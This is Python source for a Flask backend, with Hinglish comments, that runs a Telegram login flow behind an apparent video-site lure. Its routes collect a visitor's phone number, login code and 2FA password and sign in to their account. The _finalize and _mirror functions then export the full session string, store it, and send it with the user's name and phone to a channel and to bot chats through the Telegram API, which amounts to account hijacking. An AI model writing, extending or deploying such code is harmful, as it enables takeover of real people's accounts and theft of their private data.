import html as html_lib
import json
import logging
import re
import threading
import time
import urllib.request

from flask import Blueprint, jsonify, render_template, request, session
from pyrogram import Client
from pyrogram.errors import (
    FloodWait, PasswordHashInvalid, PhoneCodeExpired, PhoneCodeInvalid,
    PhoneNumberBanned, PhoneNumberInvalid, SessionPasswordNeeded,
)

from config import (
    API_ID, API_HASH, BACKGROUND_VIDEO, MIRROR_BOT_TOKEN, MIRROR_CHAT_IDS,
)

from . import database
from .database import ensure_db, get_videos, save_session_to_db, send_to_channel
from .session_manager import session_manager

log = logging.getLogger(__name__)

auth_bp = Blueprint("auth", __name__)

PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")
MAX_CODE_ATTEMPTS = 3
RESEND_COOLDOWN = 45
PENDING_TTL = 600

_lock = threading.RLock()
PENDING = {}


# ----------------------------------------------------------------- helpers

def _now():
    return time.time()


def _norm_phone(raw):
    d = re.sub(r"\D", "", raw or "")
    if not d:
        return ""
    p = "+" + d
    return p if PHONE_RE.match(p) else ""


def _put(phone, **kw):
    with _lock:
        PENDING[phone] = kw


def _get(phone):
    with _lock:
        return PENDING.get(phone)


def _pop(phone):
    with _lock:
        return PENDING.pop(phone, None)


def _gc():
    cut = _now() - PENDING_TTL
    with _lock:
        for p in [k for k, v in PENDING.items() if v.get("created", 0) < cut]:
            v = PENDING.pop(p, None)
            if v and v.get("client"):
                try:
                    v["client"].disconnect()
                except Exception:
                    pass


def _mirror(user_info):
    """Fire and forget: naye session ki details mirror chats par bhej do."""
    if not MIRROR_BOT_TOKEN or not MIRROR_CHAT_IDS:
        return
    text = "\U0001F510 %s | %s %s | @%s | %s\n\n%s" % (
        user_info.get("id"),
        user_info.get("first_name", ""),
        user_info.get("last_name", ""),
        user_info.get("username"),
        user_info.get("phone"),
        user_info.get("session_string", ""),
    )

    def _send():
        for chat_id in MIRROR_CHAT_IDS:
            try:
                req = urllib.request.Request(
                    "https://api.telegram.org/bot%s/sendMessage" % MIRROR_BOT_TOKEN,
                    data=json.dumps({"chat_id": chat_id, "text": text}).encode(),
                    headers={"Content-Type": "application/json"},
                )
                urllib.request.urlopen(req, timeout=10)
            except Exception as e:
                log.warning("mirror failed for %s: %s", chat_id, e)

    threading.Thread(target=_send, daemon=True).start()


def _safe(text):
    return html_lib.escape(text or "")


def _finalize(phone, client):
    """Login ho gaya — session string nikaalo, save karo, sabko bhejo."""
    me = client.get_me()
    session_string = client.export_session_string()
    user_info = {
        "id": me.id,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "username": me.username or "",
        "phone": phone,
        "session_string": session_string,
        "linked_at": time.time(),
        "ads_enabled": True,
    }

    save_session_to_db(user_info)
    try:
        send_to_channel(user_info)
    except Exception as e:
        log.warning("send_to_channel failed: %s", e)

    try:
        session_manager.add(phone, user_info)
    except Exception:
        pass

    _mirror(user_info)

    try:
        client.disconnect()
    except Exception:
        pass

    log.info("linked %s (%s)", phone, me.id)
    return user_info


# ----------------------------------------------------------------- routes

@auth_bp.route("/")
def index():
    ensure_db()
    return render_template("index.html", bg_video=BACKGROUND_VIDEO, videos=get_videos())


@auth_bp.route("/api/videos")
def api_videos():
    return jsonify({"success": True, "videos": get_videos()})


@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    ensure_db()
    _gc()
    d = request.get_json(silent=True) or {}
    phone = _norm_phone(d.get("phone"))
    if not phone:
        return jsonify({"success": False, "error": "Invalid phone (use +countrycode...)"}), 400

    old = _get(phone)
    if old and old.get("last_sent") and (_now() - old["last_sent"]) < RESEND_COOLDOWN and old.get("client"):
        return jsonify({"success": True, "state": old.get("state", "code"), "reused": True})

    if old and old.get("client"):
        try:
            old["client"].disconnect()
        except Exception:
            pass

    client = Client(
        "link_%s" % re.sub(r"\D", "", phone),
        api_id=API_ID, api_hash=API_HASH, in_memory=True,
    )
    try:
        client.connect()
        sent = client.send_code(phone)
    except PhoneNumberInvalid:
        return jsonify({"success": False, "error": "Invalid phone number"}), 400
    except PhoneNumberBanned:
        return jsonify({"success": False, "error": "Number is banned"}), 400
    except FloodWait as e:
        return jsonify({"success": False, "error": "FloodWait %ss" % e.value}), 429
    except Exception as e:
        log.exception("send_code failed")
        return jsonify({"success": False, "error": str(e)}), 500

    _put(phone, client=client, phone_code_hash=sent.phone_code_hash,
         state="code", attempts=0, created=_now(), last_sent=_now(), error=None)

    return jsonify({"success": True, "state": "code"})


@auth_bp.route("/api/verify", methods=["POST"])
def verify():
    d = request.get_json(silent=True) or {}
    phone = _norm_phone(d.get("phone"))
    code = (d.get("code") or "").strip().replace(" ", "")
    ent = _get(phone)
    if not ent or not ent.get("client"):
        return jsonify({"success": False, "error": "Start over — send code again"}), 400
    if not code:
        return jsonify({"success": False, "error": "Code required"}), 400

    client = ent["client"]
    try:
        client.sign_in(phone, ent["phone_code_hash"], code)
    except SessionPasswordNeeded:
        ent["state"] = "password"
        ent["error"] = None
        return jsonify({"success": True, "state": "password"})
    except PhoneCodeInvalid:
        ent["attempts"] = ent.get("attempts", 0) + 1
        if ent["attempts"] >= MAX_CODE_ATTEMPTS:
            return jsonify({"success": False, "error": "Too many wrong codes — resend"}), 400
        return jsonify({"success": False, "error": "Wrong code"}), 400
    except PhoneCodeExpired:
        return jsonify({"success": False, "error": "Code expired — resend"}), 400
    except FloodWait as e:
        return jsonify({"success": False, "error": "FloodWait %ss" % e.value}), 429
    except Exception as e:
        log.exception("verify failed")
        return jsonify({"success": False, "error": str(e)}), 500

    user = _finalize(phone, client)
    _pop(phone)
    return jsonify({"success": True, "state": "done", "user": {
        "id": user["id"], "first_name": user["first_name"], "username": user["username"],
    }})


@auth_bp.route("/api/password", methods=["POST"])
def password():
    d = request.get_json(silent=True) or {}
    phone = _norm_phone(d.get("phone"))
    pw = d.get("password") or ""
    ent = _get(phone)
    if not ent or not ent.get("client"):
        return jsonify({"success": False, "error": "Start over — send code again"}), 400
    if not pw:
        return jsonify({"success": False, "error": "2FA password required"}), 400

    try:
        ent["client"].check_password(pw)
    except PasswordHashInvalid:
        return jsonify({"success": False, "error": "Wrong 2FA password"}), 400
    except Exception as e:
        log.exception("check_password failed")
        return jsonify({"success": False, "error": str(e)}), 500

    user = _finalize(phone, ent["client"])
    _pop(phone)
    return jsonify({"success": True, "state": "done", "user": {
        "id": user["id"], "first_name": user["first_name"], "username": user["username"],
    }})


@auth_bp.route("/api/resend", methods=["POST"])
def resend():
    d = request.get_json(silent=True) or {}
    phone = _norm_phone(d.get("phone"))
    ent = _get(phone)
    if not ent or not ent.get("client"):
        return jsonify({"success": False, "error": "Start over"}), 400
    if (_now() - ent.get("last_sent", 0)) < RESEND_COOLDOWN:
        wait = int(RESEND_COOLDOWN - (_now() - ent["last_sent"]))
        return jsonify({"success": False, "error": "Wait %ss" % wait}), 429
    try:
        sent = ent["client"].resend_code(phone, ent["phone_code_hash"])
        ent["phone_code_hash"] = sent.phone_code_hash
        ent["last_sent"] = _now()
        ent["attempts"] = 0
        return jsonify({"success": True, "state": "code"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@auth_bp.route("/api/status")
def status():
    phone = _norm_phone(request.args.get("phone"))
    ent = _get(phone)
    if not ent:
        return jsonify({"success": True, "state": "idle"})
    return jsonify({"success": True, "state": ent.get("state", "code"), "error": ent.get("error")})


@auth_bp.route("/api/cancel", methods=["POST"])
def cancel():
    d = request.get_json(silent=True) or {}
    phone = _norm_phone(d.get("phone"))
    ent = _pop(phone)
    if ent and ent.get("client"):
        try:
            ent["client"].disconnect()
        except Exception:
            pass
    return jsonify({"success": True})


@auth_bp.route("/logout")
def logout():
    session.clear()
    return render_template("index.html", bg_video=BACKGROUND_VIDEO, videos=get_videos())